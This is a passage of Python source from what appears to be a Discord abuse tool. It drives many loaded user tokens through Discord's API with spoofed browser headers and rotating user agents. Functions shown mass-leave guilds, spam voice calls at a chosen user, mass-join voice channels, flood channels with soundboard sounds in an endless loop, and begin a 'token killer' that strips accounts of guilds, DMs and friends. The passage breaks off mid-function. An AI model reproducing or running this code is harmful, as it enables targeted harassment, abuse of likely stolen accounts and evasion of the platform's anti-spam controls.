    time.sleep(delay)
    
    url = f"https://discord.com/api/v9/users/@me/guilds/{guild_id}"
    user_agent = random.choice(user_agents)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": user_agent,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Origin": "https://discord.com",
        "Referer": f"https://discord.com/channels/{guild_id}",
        "Sec-CH-UA": '"Google Chrome";v="131", "Not;A=Brand";v="99"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Discord-Locale": "en-US"
    }
    
    payload = {
        "lurking": False
    }
    
    try:
        session = requests.Session()
        session.headers.update(headers)
        
        response = session.delete(url, json=payload, timeout=30)
        
        if response.status_code == 204:
            pass
            with lock:
                success_count[0] += 1
        elif response.status_code == 401:
            console_logger(f"{masked_token} - Invalid token (401)", "error")
            with lock:
                failed_count[0] += 1
        elif response.status_code == 403:
            console_logger(f"{masked_token} - Cannot leave guild (403) - Owner or insufficient permissions", "error")
            with lock:
                failed_count[0] += 1
        elif response.status_code == 404:
            console_logger(f"{masked_token} - Guild not found (404) - Not a member or invalid guild ID", "error")
            with lock:
                failed_count[0] += 1
        elif response.status_code == 429:
            retry_after = response.headers.get('Retry-After', '60')
            retry_time = int(retry_after) + random.uniform(2, 5)
            console_logger(f"{masked_token} - Rate limited! Waiting {retry_time:.1f}s...", "warning")
            time.sleep(retry_time)
            with lock:
                failed_count[0] += 1
        else:
            console_logger(f"{masked_token} - Failed with status {response.status_code}", "error")
            with lock:
                failed_count[0] += 1
            
        session.close()
            
    except requests.exceptions.Timeout:
        console_logger(f"{masked_token} - Request timeout", "error")
        with lock:
            failed_count[0] += 1
    except requests.exceptions.ConnectionError:
        console_logger(f"{masked_token} - Connection error", "error")
        with lock:
            failed_count[0] += 1
    except Exception as e:
        console_logger(f"{masked_token} - Unexpected error - {str(e)}", "error")
        with lock:
            failed_count[0] += 1

def leave_guild_multi(guild_id):
    tokens = load_tokens_from_file()
    
    if not tokens:
        console_logger("No tokens found to process", "error")
        return
    
    import threading
    
    success_count = [0]
    failed_count = [0]
    lock = threading.Lock()
    
    
    def background_leaver():
        threads = []
        
        for i, token in enumerate(tokens):
            thread = threading.Thread(
                target=leave_guild_worker,
                args=(token, guild_id, success_count, failed_count, lock),
                daemon=True
            )
            threads.append(thread)
            thread.start()
            
            time.sleep(random.uniform(0.2, 0.5))
        
        for thread in threads:
            thread.join()
        
        console_logger(f"Guild leave completed! Success: {success_count[0]}, Failed: {failed_count[0]}", "info")
    
    background_thread = threading.Thread(target=background_leaver, daemon=True)
    background_thread.start()
    
    console_logger("Guild leave started in background!", "success")


def leave_guild_single(token, guild_id):
    url = f"https://discord.com/api/v9/users/@me/guilds/{guild_id}"
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    }
    
    payload = {
        "lurking": False
    }
    
    try:
        response = requests.delete(url, headers=headers, json=payload, timeout=30)
        
        if response.status_code == 204:
            pass
            return True
        elif response.status_code == 401:
            console_logger("Invalid token (401)", "error")
        elif response.status_code == 403:
            console_logger("Cannot leave guild (403) - You might be the owner or lack permissions", "error")
        elif response.status_code == 404:
            console_logger("Guild not found (404) - Not a member or invalid guild ID", "error")
        else:
            console_logger(f"Failed to leave guild: HTTP {response.status_code}", "error")
            console_logger(response.text, "debug")
        
        return False
        
    except Exception as e:
        console_logger(f"Error leaving guild: {str(e)}", "error")
        return False

# End

# Server Joiner

# BRUh


# End

# Call Spammer
def call_user_multi(user_id, times=1):
    tokens = load_tokens_from_file()
    if not tokens:
        console_logger("No tokens found", "error")
        return

    success_count = 0
    failed_count = 0

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    ]

    def establish_websocket_call(token, gateway_url, dm_channel_id, user_id):
        try:
            import ssl
            import websocket as ws

            call_established = False

            def on_message(websocket, message):
                nonlocal call_established
                try:
                    data = json.loads(message)

                    if data.get("op") == 10: 
                        identify = {
                            "op": 2,
                            "d": {
                                "token": token,
                                "properties": {
                                    "$os": "windows",
                                    "$browser": "chrome",
                                    "$device": "desktop"
                                },
                                "compress": False,
                                "large_threshold": 50
                            }
                        }
                        websocket.send(json.dumps(identify))

                    elif data.get("op") == 0 and data.get("t") == "READY":
                        voice_state = {
                            "op": 4,
                            "d": {
                                "guild_id": None,
                                "channel_id": dm_channel_id,
                                "self_mute": False,
                                "self_deaf": False
                            }
                        }
                        websocket.send(json.dumps(voice_state))
                        call_established = True

                except Exception:
                    pass

            websocket = ws.WebSocketApp(
                f"{gateway_url}/?v=9&encoding=json",
                on_message=on_message
            )

            import threading
            def run_ws():
                websocket.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})

            ws_thread = threading.Thread(target=run_ws, daemon=True)
            ws_thread.start()

            timeout = 5 
            start_time = time.time()
            while not call_established and (time.time() - start_time) < timeout:
                time.sleep(0.1) 

            websocket.close()
            return call_established

        except Exception:
            return False

    for token in tokens:
        masked_token = mask_token(token)
        user_agent = random.choice(user_agents)

        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": user_agent
        }

        # Create DM
        try:
            dm_response = requests.post(
                "https://discord.com/api/v9/users/@me/channels",
                headers=headers,
                json={"recipient_id": user_id},
                timeout=10
            )

            if dm_response.status_code != 200:
                console_logger(f"{masked_token} - Failed to create DM: {dm_response.status_code}", "error")
                failed_count += 1
                continue

            dm_channel_id = dm_response.json()["id"]

        except Exception as e:
            console_logger(f"{masked_token} - DM creation error: {str(e)}", "error")
            failed_count += 1
            continue

        for _ in range(times):
            try:
                gateway_response = requests.get("https://discord.com/api/v9/gateway", headers=headers, timeout=10)
                if gateway_response.status_code == 200:
                    gateway_url = gateway_response.json()["url"]

                    if establish_websocket_call(token, gateway_url, dm_channel_id, user_id):
                        console_logger(f"{masked_token} - WebSocket voice call established", "success")
                        success_count += 1
                    else:
                        console_logger(f"{masked_token} - WebSocket call failed", "error")
                        failed_count += 1
                else:
                    console_logger(f"{masked_token} - Gateway connection failed", "error")
                    failed_count += 1

            except Exception as e:
                console_logger(f"{masked_token} - Exception: {str(e)}", "error")
                failed_count += 1

    console_logger(f"Voice call spam completed! Success: {success_count}, Failed: {failed_count}", "info")




# End

# Join Voice Channel
active_voice_connections = []

def emergency_disconnect_all():
    global active_voice_connections
    
    for connection in active_voice_connections:
        try:
            if connection.get('websocket'):
                disconnect_payload = {
                    "op": 4,
                    "d": {
                        "guild_id": connection.get('guild_id'),
                        "channel_id": None,
                        "self_mute": False,
                        "self_deaf": False
                    }
                }
                try:
                    connection['websocket'].send(json.dumps(disconnect_payload))
                    time.sleep(0.05)  
                except:
                    pass 
                
                try:
                    connection['websocket'].close()
                except:
                    pass
                    
        except Exception as e:
            pass 
    
    active_voice_connections = []

def cleanup_handler(signum=None, frame=None):
    emergency_disconnect_all()
    sys.exit(0)

def setup_cleanup():
    signal.signal(signal.SIGINT, cleanup_handler)
    
    atexit.register(emergency_disconnect_all)
    
    if hasattr(signal, 'SIGBREAK'):
        signal.signal(signal.SIGBREAK, cleanup_handler)

def establish_persistent_voice_join(token, gateway_url, channel_id, guild_id):
    try:
        join_established = False
        heartbeat_interval = None
        last_sequence = None
        
        def send_heartbeat(websocket):
            while True:
                if heartbeat_interval:
                    time.sleep(heartbeat_interval / 1000.0)
                    heartbeat = {
                        "op": 1,
                        "d": last_sequence
                    }
                    try:
                        websocket.send(json.dumps(heartbeat))
                    except:
                        break
                else:
                    time.sleep(1)
        
        def on_message(websocket, message):
            nonlocal join_established, heartbeat_interval, last_sequence
            try:
                data = json.loads(message)
                
                if data.get('op') == 10:  # Hello
                    heartbeat_interval = data['d']['heartbeat_interval']
                    
                    heartbeat_thread = threading.Thread(target=send_heartbeat, args=(websocket,), daemon=True)
                    heartbeat_thread.start()
                    
                    identify = {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "$os": "windows",
                                "$browser": "chrome",
                                "$device": "desktop"
                            },
                            "compress": False,
                            "large_threshold": 50
                        }
                    }
                    websocket.send(json.dumps(identify))
                    
                elif data.get('op') == 0:
                    last_sequence = data.get('s')
                    
                    if data.get('t') == 'READY':
                        voice_state = {
                            "op": 4,
                            "d": {
                                "guild_id": guild_id,
                                "channel_id": channel_id,
                                "self_mute": True, 
                                "self_deaf": False
                            }
                        }
                        websocket.send(json.dumps(voice_state))
                        join_established = True
                    
                elif data.get('op') == 11:  
                    pass 
                    
            except Exception as e:
                pass
        
        def on_error(websocket, error):
            console_logger(f"WebSocket error: {error}", "error")
            
        websocket = ws.WebSocketApp(
            f"{gateway_url}/?v=9&encoding=json",
            on_message=on_message,
            on_error=on_error,
        )
        
        import threading
        def run_ws():
            websocket.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
        
        ws_thread = threading.Thread(target=run_ws, daemon=False)
        ws_thread.start()
        
        timeout = 10
        start_time = time.time()
        while not join_established and (time.time() - start_time) < timeout:
            time.sleep(0.5)
        
        if join_established:
            connection_info = {
                'websocket': websocket,
                'thread': ws_thread,
                'token': token,
                'channel_id': channel_id,
                'guild_id': guild_id
            }
            active_voice_connections.append(connection_info)
        
        return join_established
        
    except Exception as e:
        console_logger(f"WebSocket connection error: {str(e)}", "error")
        return False

def disconnect_all_voice():
    global active_voice_connections
    for connection in active_voice_connections:
        try:
            disconnect_payload = {
                "op": 4,
                "d": {
                    "guild_id": connection.get('guild_id'),
                    "channel_id": None, 
                    "self_mute": False,
                    "self_deaf": False
                }
            }
            
            if connection.get('websocket'):
                connection['websocket'].send(json.dumps(disconnect_payload))
                time.sleep(0.1)
                connection['websocket'].close()
                
            console_logger(f"Properly disconnected from voice channel {connection['channel_id']}", "info")
        except Exception as e:
            try:
                if connection.get('websocket'):
                    connection['websocket'].close()
            except:
                pass
    
    active_voice_connections = []

def join_voice_channel_multi(channel_id):
    tokens = load_tokens_from_file()
    if not tokens:
        console_logger("No tokens found", "error")
        return

    success_count = 0
    failed_count = 0

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    ]

    for token in tokens:
        masked_token = mask_token(token)
        user_agent = random.choice(user_agents)
        
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me",
            "Sec-CH-UA": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Bangkok",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM5LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjQzNTM5NiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6ImVhZjkzYTcyLWRhNTctNGZhYi05NzkzLTVlZjM1ZjExYzUwNSIsImxhdW5jaF9zaWduYXR1cmUiOiIyYjdkMjRlMy0xMDI0LTQwMzUtOGY1YS0zNzJlYzQxYjE3N2MiLCJjbGllbnRfaGVhcnRiZWF0X3Nlc3Npb25faWQiOiI0MzdmYjIwZS1jY2Y4LTQ5NDUtYWYwNi02NmEzYWZkNWFmZGIiLCJjbGllbnRfYXBwX3N0YXRlIjoiZm9jdXNlZCJ9"
        }

        try:
            channel_response = requests.get(
                f"https://discord.com/api/v9/channels/{channel_id}",
                headers=headers,
                timeout=30
            )

            if channel_response.status_code == 404:
                console_logger(f"{masked_token} - Channel not found (404) - Invalid channel ID or no access", "error")
                failed_count += 1
                continue
            elif channel_response.status_code == 403:
                console_logger(f"{masked_token} - No permission to view channel (403)", "error")
                failed_count += 1
                continue
            elif channel_response.status_code != 200:
                console_logger(f"{masked_token} - Failed to get channel info: {channel_response.status_code}", "error")
                failed_count += 1
                continue

            channel_data = channel_response.json()
            guild_id = channel_data.get("guild_id")
            channel_type = channel_data.get("type")
            channel_name = channel_data.get("name", "Unknown")

            if channel_type not in [2, 13]: 
                console_logger(f"{masked_token} - Channel '{channel_name}' is not a voice channel (Type: {channel_type})", "error")
                failed_count += 1
                continue

            voice_state_payload = {
                "channel_id": channel_id,
                "self_mute": True,  
                "self_deaf": False
            }

            if guild_id:
                voice_url = f"https://discord.com/api/v9/guilds/{guild_id}/voice-states/@me"
                voice_state_payload = {
                    "channel_id": channel_id,
                    "self_mute": True, 
                    "self_deaf": False
                }
            else:
                voice_url = "https://discord.com/api/v9/guilds/@me/voice-states/@me"
                voice_state_payload = {
                    "guild_id": None,
                    "channel_id": channel_id,
                    "self_mute": True,
                    "self_deaf": False
                }

            voice_response = requests.patch(
                voice_url,
                headers=headers,
                json=voice_state_payload,
                timeout=30
            )

            if voice_response.status_code in [200, 204]:
                success_count += 1
            elif voice_response.status_code == 404:
                
                alt_response = requests.put(
                    voice_url,
                    headers=headers,
                    json=voice_state_payload,
                    timeout=30
                )
                
                if alt_response.status_code in [200, 204]:
                    success_count += 1 
                else:
                    try:
                        gateway_response = requests.get("https://discord.com/api/v9/gateway", headers=headers)
                        if gateway_response.status_code == 200:
                            gateway_url = gateway_response.json()['url']
                            ws_success = establish_persistent_voice_join(token, gateway_url, channel_id, guild_id)
                            if ws_success:
                                console_logger(f"{masked_token}", "success")
                                success_count += 1
                            else:
                                console_logger(f"{masked_token} - All voice join methods failed", "error")
                                failed_count += 1
                        else:
                            console_logger(f"{masked_token} - Voice channel not found (404) - Channel may have been deleted", "error")
                            failed_count += 1
                    except:
                        console_logger(f"{masked_token} - Voice channel not found (404) - Channel may have been deleted", "error")
                        failed_count += 1
            elif voice_response.status_code == 403:
                console_logger(f"{masked_token} - No permission to join voice channel (403) - Missing Connect permission", "error")
                failed_count += 1
            elif voice_response.status_code == 401:
                console_logger(f"{masked_token} - Invalid token (401 Unauthorized)", "error")
                failed_count += 1
            elif voice_response.status_code == 429:
                retry_after = voice_response.headers.get('Retry-After', '60')
                console_logger(f"{masked_token} - Rate limited! Waiting {retry_after}s...", "warning")
                time.sleep(int(retry_after) + random.uniform(1, 3))
                failed_count += 1
            elif voice_response.status_code == 400:
                console_logger(f"{masked_token} - Bad request (400) - Invalid voice state data", "error")
                failed_count += 1
            else:
                console_logger(f"{masked_token} - Failed to join voice channel: {voice_response.status_code}", "error")
                try:
                    error_data = voice_response.json()
                    if 'message' in error_data:
                        console_logger(f"{masked_token} - Error details: {error_data['message']}", "debug")
                except:
                    pass
                failed_count += 1

            time.sleep(random.uniform(2, 4))

        except Exception as e:
            console_logger(f"{masked_token} - Voice channel join error: {str(e)}", "error")
            failed_count += 1

    console_logger(f"Voice channel join completed! Success: {success_count}, Failed: {failed_count}", "info")

# End

# Soundboard Spam
def soundboard_spam_multi(channel_id, spam_count=10):
    tokens = load_tokens_from_file()
    if not tokens:
        console_logger("No tokens found", "error")
        return

    success_count = 0
    failed_count = 0

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    ]

    sound_ids = ["1", "2", "3", "4", "5"]

    for token in tokens:
        masked_token = mask_token(token)
        user_agent = random.choice(user_agents)
        
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me",
            "Sec-CH-UA": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Bangkok",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM5LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjQzNTM5NiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6ImVhZjkzYTcyLWRhNTctNGZhYi05NzkzLTVlZjM1ZjExYzUwNSIsImxhdW5jaF9zaWduYXR1cmUiOiIyYjdkMjRlMy0xMDI0LTQwMzUtOGY1YS0zNzJlYzQxYjE3N2MiLCJjbGllbnRfaGVhcnRiZWF0X3Nlc3Npb25faWQiOiI0MzdmYjIwZS1jY2Y4LTQ5NDUtYWYwNi02NmEzYWZkNWFmZGIiLCJjbGllbnRfYXBwX3N0YXRlIjoiZm9jdXNlZCJ9"
        }

        for i in range(spam_count):
            try:
                sound_id = random.choice(sound_ids)
                
                soundboard_url = f"https://discord.com/api/v9/channels/{channel_id}/send-soundboard-sound"
                soundboard_payload = {
                    "sound_id": sound_id
                }

                soundboard_response = requests.post(
                    soundboard_url,
                    headers=headers,
                    json=soundboard_payload,
                    timeout=30
                )

                if soundboard_response.status_code in [200, 201, 204]:
                    console_logger(f"{masked_token} ", "success")
                    success_count += 1
                elif soundboard_response.status_code == 404:
                    console_logger(f"{masked_token} - Channel not found (404)", "error")
                    break  
                elif soundboard_response.status_code == 403:
                    console_logger(f"{masked_token} - No permission to send soundboard (403)", "error")
                    break  
                elif soundboard_response.status_code == 401:
                    console_logger(f"{masked_token} - Invalid token (401 Unauthorized)", "error")
                    break
                elif soundboard_response.status_code == 429:
                    retry_after = soundboard_response.headers.get('Retry-After', '5')
                    console_logger(f"{masked_token} - Rate limited! Waiting {retry_after}s...", "warning")
                    time.sleep(int(retry_after) + random.uniform(1, 3))
                    failed_count += 1
                else:
                    console_logger(f"{masked_token} - Failed to send soundboard: {soundboard_response.status_code}", "error")
                    failed_count += 1

                time.sleep(random.uniform(0.5, 2.0))

            except Exception as e:
                console_logger(f"{masked_token} - Soundboard error: {str(e)}", "error")
                failed_count += 1


        time.sleep(random.uniform(1, 3))

    console_logger(f"Soundboard spam completed! Success: {success_count}, Failed: {failed_count}", "info")

def soundboard_spam_continuous(channel_ids):
    tokens = load_tokens_from_file()
    if not tokens:
        console_logger("No tokens found", "error")
        return

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    ]

    sound_ids = ["1", "2", "3", "4", "5"]
    
    console_logger(f"Starting continuous soundboard spam on {len(channel_ids)} channels...", "success")
    
    while True:  
        for channel_id in channel_ids:
            for token in tokens:
                try:
                    masked_token = mask_token(token)
                    user_agent = random.choice(user_agents)
                    
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": user_agent,
                        "Accept": "*/*",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Accept-Encoding": "gzip, deflate, br, zstd",
                        "Origin": "https://discord.com",
                        "Referer": "https://discord.com/channels/@me",
                        "Sec-CH-UA": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
                        "Sec-CH-UA-Mobile": "?0",
                        "Sec-CH-UA-Platform": '"Windows"',
                        "Sec-Fetch-Dest": "empty",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Site": "same-origin",
                        "X-Debug-Options": "bugReporterEnabled",
                        "X-Discord-Locale": "en-US",
                        "X-Discord-Timezone": "Asia/Bangkok",
                        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM5LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjQzNTM5NiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6ImVhZjkzYTcyLWRhNTctNGZhYi05NzkzLTVlZjM1ZjExYzUwNSIsImxhdW5jaF9zaWduYXR1cmUiOiIyYjdkMjRlMy0xMDI0LTQwMzUtOGY1YS0zNzJlYzQxYjE3N2MiLCJjbGllbnRfaGVhcnRiZWF0X3Nlc3Npb25faWQiOiI0MzdmYjIwZS1jY2Y4LTQ5NDUtYWYwNi02NmEzYWZkNWFmZGIiLCJjbGllbnRfYXBwX3N0YXRlIjoiZm9jdXNlZCJ9"
                    }

                    sound_id = random.choice(sound_ids)
                    
                    soundboard_url = f"https://discord.com/api/v9/channels/{channel_id}/send-soundboard-sound"
                    soundboard_payload = {
                        "sound_id": sound_id
                    }

                    soundboard_response = requests.post(
                        soundboard_url,
                        headers=headers,
                        json=soundboard_payload,
                        timeout=30
                    )

                    if soundboard_response.status_code in [200, 201, 204]:
                        console_logger(f"{masked_token} ", "success")
                    elif soundboard_response.status_code == 429:
                        retry_after = soundboard_response.headers.get('Retry-After', '1')
                        console_logger(f"{masked_token} - Rate limited! Waiting {retry_after}s...", "warning")
                        time.sleep(int(retry_after) + random.uniform(0.1, 0.3))
                    else:
                        console_logger(f"{masked_token} - Failed: {soundboard_response.status_code}", "error")
                        
                    time.sleep(random.uniform(0.05, 0.15))

                except KeyboardInterrupt:
                    raise  
                except Exception as e:
                    console_logger(f"Soundboard error: {str(e)}", "error")

                time.sleep(random.uniform(0.02, 0.08))

# End



# # # #

# Token Killer Function (Background Threaded Version)
def token_killer_worker(token, leave_all_guilds, close_dms, remove_friends, success_count, failed_count, lock):
    """
    Background worker function for token killing + leaving all guilds + closing DMs + removing friends
    """
    masked_token = mask_token(token)
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ]
    
    themes = ['dark', 'light']
    locales = ['ja', 'zh-TW', 'ko', 'zh-CN', 'en-US', 'en-GB', 'fr', 'de', 'es-ES', 'ru']
    
    user_agent = random.choice(user_agents)
    
    # Enhanced headers to match the provided Discord API format
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImhhc19jbGllbnRfbW9kcyI6ZmFsc2UsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjE0Mi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE0Mi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTQyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6NDM2MjMwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJjbGllbnRfbGF1bmNoX2lkIjoiZmNlMTMyMjYtNDA0Ni00MDRhLTg3NTUtZTEwYjFhYmUwNTNjIiwibGF1bmNoX3NpZ25hdHVyZSI6ImUwNmJlYzZlLTA3ZTctNDdiNy05Mzc0LTczOTAxMDExMjViMiIsImNsaWVudF9hcHBfc3RhdGUiOiJmb2N1c2VkIiwiY2xpZW50X2hlYXJ0YmVhdF9zZXNzaW9uX2lkIjoiM2U0NGZjNGUtNmUzMy00Y2Q5LTk5OTMtZWYyMTRmNzY1ZjQ0In0=",
        "X-Discord-Locale": "fr",
        "X-Discord-Timezone": "Asia/Bangkok",
        "X-Debug-Options": "bugReporterEnabled",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "DNT": "1",
        "Sec-GPC": "1"
    }
    
    spam_cycles = random.randint(50, 150)
    
    if leave_all_guilds:
        try:
            session = requests.Session()
            session.headers.update(headers)

            guilds_response = session.get(
                "https://discord.com/api/v9/users/@me/guilds",
                timeout=30
            )
            
            if guilds_response.status_code == 200:
                guilds = guilds_response.json()
                
                leave_count = 0
                for guild in guilds:
                    try:
                        guild_id_current = guild['id']
                        guild_name = guild.get('name', 'Unknown')

                        if guild.get('owner', False):
                            continue
                        
                        leave_url = f"https://discord.com/api/v9/users/@me/guilds/{guild_id_current}"
                        leave_payload = {"lurking": False}
                        
                        leave_response = session.delete(leave_url, json=leave_payload, timeout=30)
                        
                        if leave_response.status_code == 204:
                            pass
                            leave_count += 1
                        elif leave_response.status_code == 403:
                            console_logger(f"{masked_token} - Cannot leave {guild_name} (owner/permissions)", "warning")
                        else:
                            console_logger(f"{masked_token} - Failed to leave {guild_name}: {leave_response.status_code}", "warning")
                        
                        time.sleep(random.uniform(0.5, 1.5))
                        
                    except Exception as e:
                        console_logger(f"{masked_token} - Error leaving guild {guild.get('name', 'Unknown')}: {str(e)}", "warning")
                
            elif guilds_response.status_code == 401:
